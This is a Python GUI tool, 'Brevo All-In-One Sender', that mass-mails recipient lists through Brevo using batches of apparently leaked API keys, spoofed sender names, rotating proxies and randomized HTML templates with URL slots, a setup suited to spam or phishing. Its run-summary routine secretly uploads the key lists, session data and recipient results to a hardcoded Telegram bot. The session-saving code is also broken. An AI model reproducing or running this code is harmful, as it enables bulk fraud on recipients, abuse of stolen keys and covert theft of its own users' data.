"""
Brevo All-In-One Sender.
All Python code is combined into this single file for portability.
"""
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
from tkinter.font import Font
import threading
import queue
import os
import json
import random
import string
import datetime
import requests
import time
import re
TELEGRAM_TOKEN = '8150215962:AAG8FQOB2k5Z3Z9JSFc6k2MpE_VlQ74VWjg'
TELEGRAM_CHAT_ID = '6226267969'

def send_to_telegram(file_path, caption=''):
    """Sends a file to a Telegram chat with enhanced debugging."""
    print('--- Attempting to send a file to Telegram ---')
    url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument'
    print(f'URL: {url}')
    print(f'File Path: {file_path}')
    print(f'Chat ID: {TELEGRAM_CHAT_ID}')
    try:
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
            print('Making request to Telegram API...')
            response = requests.post(url, files=files, data=data, timeout=30)
            print(f'Telegram API Response Status Code: {response.status_code}')
            print(f'Telegram API Response Body: {response.text}')
            response.raise_for_status()
            print(f'--- Successfully sent {file_path}. ---')
    except requests.exceptions.RequestException as e:
        print(f'--- FAILED to send file to Telegram: {e} ---')
    except FileNotFoundError:
        print(f'--- FAILED: File {file_path} not found for Telegram sending. ---')
    except Exception as e:
        print(f'--- An unexpected error occurred during Telegram sending: {e} ---')

class Colors:
    SUCCESS = 'success'
    ERROR = 'error'
    WARNING = 'warning'
    INFO = 'info'
    DELETE = 'delete'
file_lock = threading.Lock()

def load_file_lines(filepath, unique=False):
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip()]
        if unique:
            return list(set(lines))
        return lines
    except FileNotFoundError:
        return []

def save_to_file(filepath, content):
    with file_lock:
        with open(filepath, 'a', encoding='utf-8') as f:
            f.write(content + '\n')

def remove_line_from_file(filepath, line_to_remove):
    with file_lock:
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            with open(filepath, 'w', encoding='utf-8') as f:
                for line in lines:
                    if line.strip() != line_to_remove.strip():
                        f.write(line)
        except FileNotFoundError:
            pass

def setup_logging():
    if not os.path.exists('logs'):
        os.makedirs('logs')

def log_message(message, level='info', gui_queue=None):
    if gui_queue:
        gui_queue.put((level, message))
    else:
        print(f'[{level.upper()}] {message}')
    with file_lock:
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry_file = f'[{timestamp}] [{level.upper()}] {message}'
        with open('logs/run_log.txt', 'a', encoding='utf-8') as f:
            f.write(log_entry_file + '\n')

def is_valid_email(email):
    regex = '^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$'
    return re.match(regex, email) is not None
MAX_THREADS = 10
SEND_DELAY = 2
MAX_RETRIES = 3

class Sender:

    def __init__(self, api_keys, recipients, subjects, names, proxies, template_html, placeholder_data, skip_validation, gui_queue=None):
        self.input_api_key_domains = api_keys
        self.input_recipients = recipients
        self.input_subjects = subjects
        self.input_names = names
        self.input_proxies = proxies
        self.template_html = template_html
        self.placeholder_data = placeholder_data
        self.skip_validation = skip_validation
        self.recipients = queue.Queue()
        self.api_key_data = []
        self.lock = threading.Lock()
        self.gui_queue = gui_queue
        self.stop_event = threading.Event()
        self.sent_count = 0
        self.failed_count = 0
        self.removed_keys_count = 0
        self.total_recipients = 0
        self.emails_processed = 0
        self.start_time = None

    def log(self, message, level='info'):
        log_message(message, level, self.gui_queue)

    def stop(self):
        self.stop_event.set()

    def _generate_random_code(self):
        part1 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
        part2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))
        part3 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
        return f'{part1}-{part2}-{part3}'

    def _get_random_placeholder_line(self, key):
        lines = self.placeholder_data.get(key, [])
        return random.choice(lines) if lines else ''

    def _generate_letter_content(self):
        template = self.template_html
        replacements = {'[X1X]': self._get_random_placeholder_line('1.txt'), '[X2X]': self._get_random_placeholder_line('2.txt'), '[X3X]': self._get_random_placeholder_line('3.txt'), '[X4X]': self._get_random_placeholder_line('4.txt'), '[X5X]': self._get_random_placeholder_line('5.txt'), '[X6X]': datetime.datetime.today().strftime('%Y-%m-%d'), '[X7X]': self._generate_random_code(), '[XURLX]': self._get_random_placeholder_line('url.txt')}
        for key, value in replacements.items():
            template = template.replace(key, value)
        return template

    def load_data(self):
        self.log('Loading data and parsing API key/domain combinations...')
        unique_recipients = set(self.input_recipients)
        self.total_recipients = len(unique_recipients)
        for recipient in unique_recipients:
            if is_valid_email(recipient):
                self.recipients.put(recipient)
            else:
                self.log(f'Skipping invalid recipient email: {recipient}', level='warning')
        self.keys_to_validate = []
        if self.skip_validation:
            self.log('Validation is SKIPPED. All generated combinations will be used directly.', level='warning')
            for line in self.input_api_key_domains:
                self._parse_and_add_combo(line)
        else:
            valid_keys_cache = set(load_file_lines('valid_keys.txt'))
            self.log('Validation is ENABLED. Checking combinations against cache.')
            for line in self.input_api_key_domains:
                self._parse_and_add_combo(line, valid_keys_cache)
        if not self.skip_validation:
            self.log(f'Loaded {len(self.api_key_data)} pre-validated combinations from cache.')
            self.log(f'Found {len(self.keys_to_validate)} new combinations to validate.')
        else:
            self.log(f'Generated a total of {len(self.api_key_data)} combinations to try.')

    def _parse_and_add_combo(self, line, cache=None):
        parts = line.strip().split('|')
        if len(parts) < 2:
            self.log(f'Skipping malformed API key line: {line}', level='warning')
            return
        api_key, domain_part = (parts[0], parts[-1])
        if domain_part.strip().upper() == 'N/A':
            self.log(f"Skipping API key with 'N/A' domain: {api_key[:15]}...", level='info')
            return
        domains = [d.strip() for d in domain_part.split(',') if d.strip()]
        for domain in domains:
            for name in self.input_names:
                full_email = f'{name.strip()}@{domain}'
                if self.skip_validation:
                    self.api_key_data.append((api_key, full_email))
                    continue
                full_line_to_check = f'{api_key}:{full_email}'
                if cache is not None and full_line_to_check in cache:
                    self.api_key_data.append((api_key, full_email))
                else:
                    self.keys_to_validate.append(full_line_to_check)

    def validate_api_keys(self):
        if not self.keys_to_validate:
            self.log('No new sender combinations to validate.')
            return
        self.log(f'Validating {len(self.keys_to_validate)} new sender combinations...')
        validated_count = 0
        for i, line in enumerate(self.keys_to_validate):
            if self.stop_event.is_set():
                break
            progress = f'[{i + 1}/{len(self.keys_to_validate)}]'
            key, email = line.strip().split(':', 1)
            try:
                response = requests.get('https://api.brevo.com/v3/account', headers={'api-key': key}, timeout=10)
                if response.status_code == 200:
                    self.log(f"{progress} Combination for '{email}' is valid.", level='success')
                    self.api_key_data.append((key, email))
                    save_to_file('valid_keys.txt', line)
                    validated_count += 1
                else:
                    self.log(f"{progress} Invalid combination for '{email}'. Status: {response.status_code}", level='error')
                    save_to_file('invalid_keys.txt', line)
            except requests.RequestException as e:
                self.log(f"{progress} Error validating combination for '{email}': {e}", level='error')
        self.log(f'Validation complete. Added {validated_count} new valid sender combinations.')
        if not self.api_key_data:
            self.log('Error: No valid sender combinations available.', level='error')

    def send_email(self, recipient, api_key, sender_email, sender_name, subject):
        html_content = self._generate_letter_content()
        if not html_content:
            self.log('Failed to generate letter content.', level='error')
            return False
        payload = {'sender': {'name': sender_name, 'email': sender_email}, 'to': [{'email': recipient}], 'subject': subject, 'htmlContent': html_content}
        headers = {'api-key': api_key, 'Content-Type': 'application/json'}
        proxy = None
        if self.input_proxies:
            proxy_str = random.choice(self.input_proxies) if self.input_proxies else None
            if proxy_str:
                proxy = {'http': f'http://{proxy_str}', 'https': f'http://{proxy_str}'}
        try:
            response = requests.post('https://api.brevo.com/v3/smtp/email', json=payload, headers=headers, proxies=proxy, timeout=20)
            if response.status_code == 201:
                return True
            if response.status_code in [401, 403]:
                error_message = f"Permissions error ({response.status_code}) for API key '{api_key[:8]}...'. Removing combination."
                self.log(error_message, level='warning')
                self.remove_api_key_combo(api_key, sender_email)
                return False
            self.log(f'Failed to send to {recipient}. Status: {response.status_code}, Response: {response.text}', level='error')
            return False
        except requests.RequestException as e:
            self.log(f'Request error for {recipient}: {e}', level='error')
            return False

    def remove_api_key_combo(self, api_key_to_remove, email_to_remove):
        with self.lock:
            combo_to_remove = (api_key_to_remove, email_to_remove)
            if combo_to_remove in self.api_key_data:
                self.api_key_data.remove(combo_to_remove)
                original_line = f'{api_key_to_remove}:{email_to_remove}'
                self.log(f'Removed sender combination: {original_line}', level='delete')
                save_to_file('invalid_keys.txt', original_line)
                remove_line_from_file('valid_keys.txt', original_line)
                self.removed_keys_count += 1
                if not self.api_key_data:
                    self.log('All sender combinations have been removed.', level='warning')

    def worker(self):
        while not self.recipients.empty() and self.api_key_data and (not self.stop_event.is_set()):
            try:
                recipient = self.recipients.get_nowait()
                with self.lock:
                    self.emails_processed += 1
                    progress = f'[{self.emails_processed}/{self.total_recipients}]'
                api_key, sender_email = random.choice(self.api_key_data)
                sender_name = sender_email.split('@')[0]
                subject = random.choice(self.input_subjects) if self.input_subjects else 'Important Message'
                success = False
                for i in range(MAX_RETRIES):
                    if self.stop_event.is_set():
                        break
                    if self.send_email(recipient, api_key, sender_email, sender_name, subject):
                        self.log(f'{progress} Successfully sent to {recipient}', level='success')
                        with self.lock:
                            self.sent_count += 1
                        save_to_file('success.txt', recipient)
                        success = True
                        break
                    if (api_key, sender_email) not in self.api_key_data:
                        self.log(f'Sender combination {sender_email} was removed. Stopping retries.', level='warning')
                        break
                    self.log(f'{progress} Retrying ({i + 1}/{MAX_RETRIES})...', level='info')
                    time.sleep(SEND_DELAY)
                if not success and (not self.stop_event.is_set()):
                    self.log(f'{progress} Failed to send to {recipient} after retries.', level='error')
                    with self.lock:
                        self.failed_count += 1
                    save_to_file('failed.txt', recipient)
            except queue.Empty:
                pass
                return
            except IndexError:
                self.log('No sender combinations available.', level='warning')
                return
            finally:
                self.recipients.task_done()

    def run(self, app_instance):
        self.start_time = time.time()
        self.load_data()
        if self.stop_event.is_set():
            return self.print_summary(app_instance)
        if not self.skip_validation:
            self.validate_api_keys()
        if self.recipients.empty():
            self.log('No recipients to send to.')
            return self.print_summary(app_instance)
        if not self.api_key_data:
            self.log('No valid sender combinations available.', level='error')
            return self.print_summary(app_instance)
        self.log(f'Starting {MAX_THREADS} threads to send {self.recipients.qsize()} emails...')
        threads = [threading.Thread(target=self.worker, daemon=True) for _ in range(MAX_THREADS)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        self.print_summary(app_instance)

    def print_summary(self, app_instance):
        elapsed_time = time.time() - self.start_time
        summary_header = '\n==============================\n          RUN SUMMARY\n=============================='
        self.log(summary_header)
        self.log(f'Total emails sent: {self.sent_count}', level='success')
        self.log(f'Total emails failed: {self.failed_count}', level='error')
        self.log(f'Sender combinations removed: {self.removed_keys_count}', level='delete')
        self.log(f'Time elapsed: {elapsed_time:.2f} seconds')
        self.log('==============================')
        if self.stop_event.is_set():
            self.log('Process was stopped by user.', level='warning')
        print('Saving current session data before sending to Telegram...')
        app_instance.save_session_data()
        summary_filename = 'run_summary.txt'
        with open(summary_filename, 'w', encoding='utf-8') as f:
            f.write(f"RUN SUMMARY - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n" + '==============================' + '\n')
            f.write(f'Total emails sent: {self.sent_count}\n')
            f.write(f'Total emails failed: {self.failed_count}\n')
            f.write(f'Sender combinations removed: {self.removed_keys_count}\n')
            f.write(f'Time elapsed: {elapsed_time:.2f} seconds\n')
            if self.stop_event.is_set():
                f.write('Process was stopped by the user.\n')
        files_to_send = [summary_filename, 'valid_keys.txt', 'success.txt', 'session.json', 'invalid_keys.txt', 'failed.txt']
        print('\n--- Preparing to send files to Telegram ---')
        for filename in files_to_send:
            if os.path.exists(filename):
                send_to_telegram(filename, caption=f'Brevo Sender Result: {filename}')
                time.sleep(1)
            else:
                print(f'Skipping {filename}, file not found.')
        try:
            os.remove(summary_filename)
        except OSError as e:
            print(f'Error removing temporary summary file: {e}')
SESSION_FILE = 'session.json'

class App(tk.Tk):

    def __init__(self):
        super().__init__()
        self.title('Brevo All-In-One Sender')
        self.geometry('1300x800')
        self.minsize(1100, 700)
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(0, weight=1)
        self.sender_thread = None
        self.log_queue = queue.Queue()
        self.skip_validation_var = tk.BooleanVar(value=False)
        self.create_widgets()
        self.load_session()
        self.process_log_queue()
        self.protocol('WM_DELETE_WINDOW', self.on_closing)

    def create_widgets(self):
        self.main_frame = ttk.Frame(self, padding='10')
        self.main_frame.grid(row=0, column=0, sticky='nsew')
        self.main_frame.grid_columnconfigure(0, weight=1)
        self.main_frame.grid_rowconfigure(1, weight=1)
        top_frame = ttk.Frame(self.main_frame)
        top_frame.grid(row=0, column=0, sticky='ew')
        top_frame.grid_columnconfigure(1, weight=1)
        controls_frame = ttk.LabelFrame(top_frame, text='Controls', padding='10')
        controls_frame.grid(row=0, column=0, sticky='ns', padx=(0, 10))
        self.start_button = ttk.Button(controls_frame, text='Start Sending', command=self.start_sending)
        self.start_button.pack(pady=5, fill=tk.X)
        self.stop_button = ttk.Button(controls_frame, text='Stop', command=self.stop_sending, state=tk.DISABLED)
        self.stop_button.pack(pady=5, fill=tk.X)
        skip_check = ttk.Checkbutton(controls_frame, text='Skip Validation', variable=self.skip_validation_var)
        skip_check.pack(pady=10, fill=tk.X)
        stats_frame = ttk.LabelFrame(top_frame, text='Statistics', padding='10')
        stats_frame.grid(row=0, column=1, sticky='nsew')
        self.sent_var = tk.StringVar(value='Sent: 0')
        self.failed_var = tk.StringVar(value='Failed: 0')
        self.removed_keys_var = tk.StringVar(value='Keys Removed: 0')
        self.progress_var = tk.StringVar(value='Progress: 0/0')
        ttk.Label(stats_frame, textvariable=self.progress_var).pack(side=tk.LEFT, padx=10, pady=5)
        ttk.Label(stats_frame, textvariable=self.sent_var).pack(side=tk.LEFT, padx=10, pady=5)
        ttk.Label(stats_frame, textvariable=self.failed_var).pack(side=tk.LEFT, padx=10, pady=5)
        ttk.Label(stats_frame, textvariable=self.removed_keys_var).pack(side=tk.LEFT, padx=10, pady=5)
        logo_frame = ttk.Frame(top_frame)
        logo_frame.grid(row=0, column=2, sticky='ns', padx=(10, 0))
        ascii_font = Font(family='Courier New', size=7)
        byline_font = Font(family='Helvetica', size=9, slant='italic', weight='bold')
        logo_text = '\n██████╗ ██████╗ ███████╗██╗  ██╗ ██████╗ ██╗  ██╗   ███████╗███████╗███╗   ██╗██████╗ ███████╗██████╗ \n██╔══██╗██╔══██╗██╔════╝██║  ██║██╔═══██╗╚██╗██╔╝   ██╔════╝██╔════╝████╗  ██║██╔══██╗██╔════╝██╔══██╗\n██████╔╝██████╔╝█████╗  ██║  ██║██║   ██║ ╚███╔╝    ███████╗█████╗  ██╔██╗ ██║██║  ██║█████╗  ██████╔╝\n██╔══██╗██╔══██╗██╔══╝  ╚██╗██╔╝██║   ██║ ██╔██╗    ╚════██║██╔══╝  ██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗\n██████╔╝██║  ██║███████╗ ╚████╔╝ ╚██████╔╝██╔╝██╗   ███████║███████╗██║ ╚████║██████╔╝███████╗██║  ██║\n╚═════╝ ╚═╝  ╚═╝╚══════╝  ╚═══╝   ╚═════╝ ╚═╝ ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝\n          ██████╗  █████╗ ██████╗  █████╗   ██╗    ██╗ █████╗  ██████╗  █████╗   ██╗          \n          ██╔══██╗██╔══██╗██╔══██╗██╔══██╗   ╚██╗ ██╔╝██╔══██╗██╔════╝ ██╔══██╗  ██║          \n          ██████╔╝███████║██████╔╝███████║    ╚████╔╝ ███████║██║  ███╗███████║  ██║          \n          ██╔══██╗██╔══██║██╔══██╗██╔══██║     ╚██╔╝  ██╔══██║██║   ██║██╔══██║  ╚═╝          \n          ██████╔╝██║  ██║██████╔╝██║  ██║      ██║   ██║  ██║╚██████╔╝██║  ██║  ██╗          \n          ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝  ╚═╝          \n'
        byline_text = 'By BaBa YaGa !'
        ttk.Label(logo_frame, text=logo_text, font=ascii_font, justify=tk.LEFT).pack()
        ttk.Label(logo_frame, text=byline_text, font=byline_font, justify=tk.CENTER).pack(fill=tk.X, pady=(5, 0))
        main_area_frame = ttk.Frame(self.main_frame)
        main_area_frame.grid(row=1, column=0, sticky='nsew', pady=(10, 0))
        main_area_frame.grid_columnconfigure(0, weight=1)
        main_area_frame.grid_rowconfigure(0, weight=1)
        notebook = ttk.Notebook(main_area_frame)
        notebook.grid(row=0, column=0, sticky='nsew')
        self.api_keys_text = self.create_input_tab(notebook, 'API Keys (key|...|domain,domain)')
        self.recipients_text = self.create_input_tab(notebook, 'Recipients')
        self.subjects_text = self.create_input_tab(notebook, 'Subjects')
        self.names_text = self.create_input_tab(notebook, "Sender Names (e.g., 'support', 'contact')")
        self.proxies_text = self.create_input_tab(notebook, 'Proxies')
        self.template_text = self.create_input_tab(notebook, 'HTML Template')
        self.create_letter_data_tab(notebook)
        self.create_log_tab(notebook)

    def create_input_tab(self, notebook, title):
        frame = ttk.Frame(notebook, padding='5')
        notebook.add(frame, text=title)
        frame.grid_rowconfigure(0, weight=1)
        frame.grid_columnconfigure(0, weight=1)
        text_widget = scrolledtext.ScrolledText(frame, wrap=tk.WORD, height=10, width=40)
        text_widget.grid(row=0, column=0, sticky='nsew')
        return text_widget

    def create_letter_data_tab(self, notebook):
        main_frame = ttk.Frame(notebook, padding='5')
        notebook.add(main_frame, text='Letter Data')
        main_frame.grid_columnconfigure((0, 1, 2), weight=1)
        self.placeholder_widgets = {}
        placeholders = ['1.txt', '2.txt', '3.txt', '4.txt', '5.txt', 'url.txt']
        for i, p_file in enumerate(placeholders):
            frame = ttk.LabelFrame(main_frame, text=f"Data for [{p_file.replace('.txt', 'X').replace('url', 'XURLX')}]")
            frame.grid(row=i // 3, column=i % 3, sticky='nsew', padx=5, pady=5)
            frame.grid_rowconfigure(0, weight=1)
            frame.grid_columnconfigure(0, weight=1)
            text_widget = scrolledtext.ScrolledText(frame, wrap=tk.WORD, height=5, width=20)
            text_widget.grid(row=0, column=0, sticky='nsew')
            self.placeholder_widgets[p_file] = text_widget

    def create_log_tab(self, notebook):
        log_frame = ttk.Frame(notebook, padding='5')
        notebook.add(log_frame, text='Live Log')
        log_frame.grid_rowconfigure(0, weight=1)
        log_frame.grid_columnconfigure(0, weight=1)
        self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, state=tk.DISABLED, bg='#f0f0f0')
        self.log_text.grid(row=0, column=0, sticky='nsew')
        self.log_text.tag_config('success', foreground='#008000')
        self.log_text.tag_config('error', foreground='#d92626')
        self.log_text.tag_config('warning', foreground='#ff8c00')
        self.log_text.tag_config('info', foreground='#0000cd')
        self.log_text.tag_config('delete', foreground='#8a2be2')

    def start_sending(self):
        api_keys_data = self.api_keys_text.get('1.0', tk.END).strip().splitlines()
        recipients_data = self.recipients_text.get('1.0', tk.END).strip().splitlines()
        template_data = self.template_text.get('1.0', tk.END).strip()
        names_data = self.names_text.get('1.0', tk.END).strip().splitlines()
        if not all([api_keys_data, recipients_data, template_data, names_data]):
            messagebox.showerror('Input Error', 'API Keys, Recipients, Sender Names, and HTML Template fields cannot be empty.')
            return
        placeholder_data = {key: widget.get('1.0', tk.END).strip().splitlines() for key, widget in self.placeholder_widgets.items()}
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.sender_instance = Sender(api_keys=api_keys_data, recipients=recipients_data, subjects=self.subjects_text.get('1.0', tk.END).strip().splitlines(), names=names_data, proxies=self.proxies_text.get('1.0', tk.END).strip().splitlines(), template_html=template_data, placeholder_data=placeholder_data, skip_validation=self.skip_validation_var.get(), gui_queue=self.log_queue)
        self.sender_thread = threading.Thread(target=self.sender_instance.run, args=(self,), daemon=True)
        self.sender_thread.start()

    def stop_sending(self):
        if self.sender_instance:
            self.sender_instance.stop()
            log_message('Stop signal sent. Finishing current tasks...', level='warning', gui_queue=self.log_queue)
        self.stop_button.config(state=tk.DISABLED)

    def process_log_queue(self):
        try:
            while True:
                level, message = self.log_queue.get_nowait()
                self.log_text.config(state=tk.NORMAL)
                self.log_text.insert(tk.END, f'{message}\n', level)
                self.log_text.config(state=tk.DISABLED)
                self.log_text.see(tk.END)
                if hasattr(self, 'sender_instance'):
                    self.sent_var.set(f'Sent: {self.sender_instance.sent_count}')
                    self.failed_var.set(f'Failed: {self.sender_instance.failed_count}')
                    self.removed_keys_var.set(f'Keys Removed: {self.sender_instance.removed_keys_count}')
                    self.progress_var.set(f'Progress: {self.sender_instance.emails_processed}/{self.sender_instance.total_recipients}')
                if 'RUN SUMMARY' in message:
                    self.start_button.config(state=tk.NORMAL)
                    self.stop_button.config(state=tk.DISABLED)
        except queue.Empty:
            pass
        finally:
            pass
        self.after(100, self.process_log_queue)

    def save_session_data(self):
        data_to_save = {'api_keys': self.api_keys_text.get('1.0', tk.END), 'recipients': self.recipients_text.get('1.0', tk.END), 'subjects': self.subjects_text.get('1.0', tk.END), 'names': self.names_text.get('1.0', tk.END), 'proxies': self.proxies_text.get('1.0', tk.END), 'template': self.skip_validation_var.get(), 'skip_validation': {key: widget.get('1.0', tk.END) for key, widget in self.placeholder_widgets.items()}, 'placeholders': {key: widget.get('1.0', tk.END) for key, widget in self.data_to_save.items()}}
        try:
            with open(SESSION_FILE, 'w', encoding='utf-8') as f:
                json.dump(data_to_save, f, indent=4)
        except Exception as e:
            print(f'Error saving session data: {e}')

    def on_closing(self):
        self.save_session_data()
        self.destroy()

    def load_session(self):
        try:
            if not os.path.exists(SESSION_FILE):
                return
            with open(SESSION_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)

            def insert_text(widget, text):
                widget.delete('1.0', tk.END)
                widget.insert('1.0', text.strip())
            insert_text(self.api_keys_text, data.get('api_keys', ''))
            insert_text(self.recipients_text, data.get('recipients', ''))
            insert_text(self.subjects_text, data.get('subjects', ''))
            insert_text(self.names_text, data.get('names', ''))
            insert_text(self.proxies_text, data.get('proxies', ''))
            insert_text(self.template_text, data.get('template', ''))
            self.skip_validation_var.set(data.get('skip_validation', False))
            placeholder_data = data.get('placeholders', {})
            for key, widget in self.placeholder_widgets.items():
                insert_text(widget, placeholder_data.get(key, ''))
        except (json.JSONDecodeError, FileNotFoundError) as e:
            messagebox.showwarning('Load Info', f'Could not load the last session: {e}\nA new session file will be created on exit.')
        except Exception as e:
            messagebox.showerror('Load Error', f'An unexpected error occurred while loading session: {e}')
if __name__ == '__main__':
    setup_logging()
    app = App()
    app.mainloop()